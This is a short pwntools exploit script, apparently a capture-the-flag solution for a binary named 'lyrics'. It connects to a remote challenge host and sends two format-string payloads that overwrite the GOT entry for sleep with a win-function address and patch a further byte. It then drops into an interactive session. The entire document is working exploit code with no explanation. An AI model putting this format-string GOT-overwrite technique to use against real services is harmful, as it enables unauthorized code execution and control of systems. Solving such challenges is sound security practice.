from pwn import *

WIN_ADDR = b"\xe9\x11\x40"
SLEEP_ADDR = b"\x58\x50\x40"

#p = process("./lyrics")
#p = gdb.debug("./lyrics")
p = remote("0.cloud.chals.io", 29376)
e = ELF("./lyrics")
context.arch = e.arch

p.recvuntil(b">>> ")

# Overwrite sleep with win
addr = 0x405058
writes = {addr: b"\xe9\x11\x40"}
payload = fmtstr_payload(6, writes)

p.sendline(payload)

p.recvuntil(b">>> ")

addr = 0x4050ac
writes = {addr: b"\x62"}
payload = fmtstr_payload(6, writes)
p.sendline(payload)

p.interactive()
